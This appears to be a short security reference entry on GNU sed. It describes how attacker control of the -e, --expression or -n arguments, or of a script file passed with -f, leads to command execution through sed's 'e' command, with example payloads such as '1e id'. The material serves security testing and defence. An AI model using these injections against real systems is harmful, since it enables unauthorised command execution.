---
title: sed
tags:
  - cli
  - config-file
  - eval-sh
references: 
- https://www.gnu.org/software/sed/manual/sed.html#sed-scripts
files: ['*.sed','*.filter']
---

`sed` or `gsed` is a line-oriented text processing utility that processes input streams or files and can modify text files efficiently.

## Injection

In the GNU version of `sed`, if the `-e`, `--expression` or `-n` parameter is controlled by the attacker, RCE is achieved. See [GTFOBins](http://gtfobins.github.io/gtfobins/sed/#command):

```sh
sed -n '1e id' any.txt
sed -e '1e id' any.txt
sed --expression '1e id' any.txt
```

## Script file

If an attacker-controlled script is used (`-f`, `--file`), RCE is achieved:

```sh
sed -f script.sed any.txt
sed --file script.sed any.txt
```

`script.sed`

```sed
1e id
```

`sed` scripts can have any extensions, but are commonly `.sed` or `.filter`.
